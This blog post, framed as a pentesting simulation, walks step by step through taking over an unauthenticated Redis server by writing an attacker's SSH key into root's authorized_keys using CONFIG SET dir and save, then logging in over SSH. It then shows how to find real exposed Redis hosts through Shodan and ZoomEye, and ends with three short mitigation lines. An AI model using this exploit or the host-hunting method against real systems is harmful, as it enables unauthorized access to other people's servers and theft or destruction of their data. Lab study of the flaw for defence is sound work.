---
layout: post
title: "Simulating Redis Unauthorized Access Vulnerability"
excerpt: "If a Redis is publicly accessible and is not protected by password, a remote attacker can exploit this to gain unauthorized access to the server. Let's learn how to set up a vulnerable redis server and attack it. We will also explore how to search and verify vulnerable redis out there with powerful search engine Shodan and automated python exploit"
categories: [pentesting-simulation]
comments: true
image:
  feature: redis-unauth-acc-vul/redis-unauthorized-access.png
  show: true
tag: ['cybersecurity', 'pentesting', 'infosec', 'redis', 'vul-simulation']
---

Redis, is an open source, widely popular data structure tool that can be used as an in-memory distributed database, message broker or cache. Since it is designed to be accessed inside trusted environments, it should not be exposed on the Internet. However, some Redis' are bind to public interface and even has no password authentication protection. 


Under certain conditions, if Redis runs with the root account, attackers can write an SSH public key file to the root account, directly logging on to the victim server through SSH. This may allow hackers to gain server privileges and delete or steal data, or even lead to an encryption extortion, critically endangering normal business services.


The simplified flow of this exploit is:

	- Login to a unprotected Redis
	- Change it's backup location to .ssh directory
	- Write the SSH Keys to new backup location
	- Remote connect and login to the target server using SSH key

We should already be familiar how automatic SSH login with private + public keys works.

## Simulation

Now let's get our hands wet and set up a target machine. We'll need two machines, they can be real machines, virtual machines, or remote machines (VPS). As long as the attack end is able to ping the target end, we are good.


Environment setup for this example:

	- Target machine: Redis-3.2.11 on Ubuntu
	- Attack machine: Kali Linux

#### Set Up Target Machine:

First, let us set up the target machine with Redis. Download source code by
```bash
wget http://download.redis.io/releases/redis-3.2.11.tar.gz
```

Extract and build
```bash
tar xzf redis-3.2.11.tar.gz
cd redis-3.2.11
make
```

After make, we can use our favorite editor to open ```redis.conf``` in ```redis-3.2.11``` folder. In order to be remotely accessed, we will comment out line ```bind 127.0.0.1``` and disable ```protected-mode``` as shown below.

![redis.conf]({{ "/assets/upload/images/redis-unauth-acc-vul/redis.conf.png" | absolute_url }}){:class="post-image center"}

Now we should fire up Redis with the configuration file we just edited. Note that ```redis-server``` is in ```redis-3.2.11/src```.

```bash
src/redis-server redis.conf
```

Now we have finished setting up the targer server. Additionally, we should also check if we have ```.ssh``` folder. If not, we should create it for the attack later. 


#### Attack Machine:

First, make sure we can ping the target. Then, we will generate a private key and public key for SSHing into the target maching later. Run the following command to generate keys and leave passphrase empty.
```bash
ssh-keygen -t rsa
```

Next, enter the ```.ssh``` folder. If you are root user, enter ```/.ssh```, otherwise ```~/.ssh```, then copy the private key in to ```temp.txt```.

```bash
(echo -e "\n\n"; cat id_rsa.pub; echo -e "\n\n") > temp.txt
```

Some may be wondering that why do we put two blank lines before and after the public key? We will leave that as a mystery for right now if you don't know :)

![ssh-keygen]({{ "/assets/upload/images/redis-unauth-acc-vul/keygen.png" | absolute_url }}){:class="post-image center"}

Good! So far we have generated a pair a keys, we will need to find a way to smuggle the public key to the Redis server (target machine.)

We are going to use ```redis-cli```, the Redis command line interface, to send commands to Redis and read the replies sent by the server directly in the terminal. 

Run the following commands in ```redis-3.2.11/src``` folder. (Or depending where we are, we can always specify the path to the files we use)

```bash
#our SSH public key|              Remote Redis IP   Command key
cat /.ssh/temp.txt | redis-cli -h 203.137.255.255 -x set s-key
```

Here, let us take a look at the command. We use ```-h``` flag to specify the remote Redis server IP so that ```redis-cli``` knows where to connect and send commands. The part after ```-x``` is saying that we are setting the key named ```s-key``` with the value in ```temp.txt```. 

![set-key]({{ "/assets/upload/images/redis-unauth-acc-vul/set_key.png" | absolute_url }}){:class="post-image center"}

Yea, we have a key with our SSH key sneaked in! Let's connect to the Redis and play around its configuration. Use ```redis-cli``` to connect to the Redis server again.

![set-backup-dir]({{ "/assets/upload/images/redis-unauth-acc-vul/set_backup_dir.png" | absolute_url }}){:class="post-image center"}

Looking at the above screenshot, we first verify the value of the key ```s-key``` by using the command ```GET s-key```, which is what we want -- the public key with two blank lines before and after. Then I tried the command "dir" just to see what it says (kidding). What we actually want to do here is to get the value of "s-key" (SSH public key) stored in the ```.ssh``` folder so that we can remote SSH login to the target machine whithout having to type the password.

Thus, we will do this:

```bash
CONFIG GET dir #  get your redis directory
# In the output of above command "/home/xxxx/redis-3.2.11/src" is the directory where redis server is installed.

CONFIG SET dir /home/xxxx/.ssh # set the backup location to the .ssh folder
(or) CONFIG SET dir /root/.ssh 

CONFIG SET dbfilename authorized_keys

# lastly we back our data containing our "s-key" key-value pair up in the .ssh folder
save

```

> The authorized_keys file in SSH specifies the SSH keys that can be used for logging into the user account for which the file is configured 
> Source: [ssh.com](https://www.ssh.com/ssh/authorized_keys/)

#### Woohoo, Harvest Time

On Attack Machine, try to SSH in the Target Machine using the following command.

```bash
# private key username@server IP
ssh -i id_rsa username@203.137.255.255
```

![sshkey-auth-login]({{ "/assets/upload/images/redis-unauth-acc-vul/sshkey_auth_login.png" | absolute_url }}){:class="post-image center"}


YAS! As we can see, we have a successful auto-login with SSH keys! Voila voila, we have now completed the attack simulation. :smile: (Smiley face actually means that I'm finally almost done writing this up :sob:)

At the end of this section, I would like to show what is Redis's backup file look like.

![sshkey-auth-login]({{ "/assets/upload/images/redis-unauth-acc-vul/sshkey_auth_login.png" | absolute_url }}){:class="post-image center"}

Notice the unreadable characters? Add "\n\n" before and after the key content was just to be safe and separate it from other "stuff" so that it can be parsed correctly. :ok_hand:

### Use Search Engine to find Vulnerable Redis Servers

Alrighty alrighty, as I mentioned, we are going to use [Shodan](https://www.shodan.io/) to search servers that has Redis footprint (characteristics).

Let us do a simple search by Redis' default port.

![shodan]({{ "/assets/upload/images/redis-unauth-acc-vul/shodan.png" | absolute_url }}){:class="post-image center"}

Looks like we have 75,665 search results. Aaaaaand guess what! Right down there (not shown but we can see it if we scroll down) there are TONS of host that has NO password protection!! :worried: :worried: :worried: 

This vulnerability was found years ago and now still countless of machines are opening up themselves in such an easy way for attackers to have fun in there server... 

According to Shodan, there are around **56,000 unprotected** Redis instances in 2015. 

![shodan-twitter]({{ "/assets/upload/images/redis-unauth-acc-vul/shodan_twit.png" | absolute_url }}){:class="post-image center"}

According to ZoomEye, the distribution of the instances is.

![zoomeye-dist]({{ "/assets/upload/images/redis-unauth-acc-vul/zoomeye_dist.png" | absolute_url }}){:class="post-image center"}

The top ranking countries of these instances are: China, USA, Germany...

![zoomeye-dist-rank]({{ "/assets/upload/images/redis-unauth-acc-vul/zoomeye_dist_rank.png" | absolute_url }}){:class="post-image center"}

Okay, we need to get back to the business. So how do we verify if a server is protected using python? It turns out to be fairly simple.

1. Use socket to connect to the target IP
2. Perform a GET request
3. If the server is unprotected, you GET request will succeed; otherwise it will fail

![redis-python-verify]({{ "/assets/upload/images/redis-unauth-acc-vul/redis_python.png" | absolute_url }}){:class="post-image center"}


## Mitigations

- Don't bind to 0.0.0.0
- If you have to, change the default port (6379)
- Set a password (for everything)
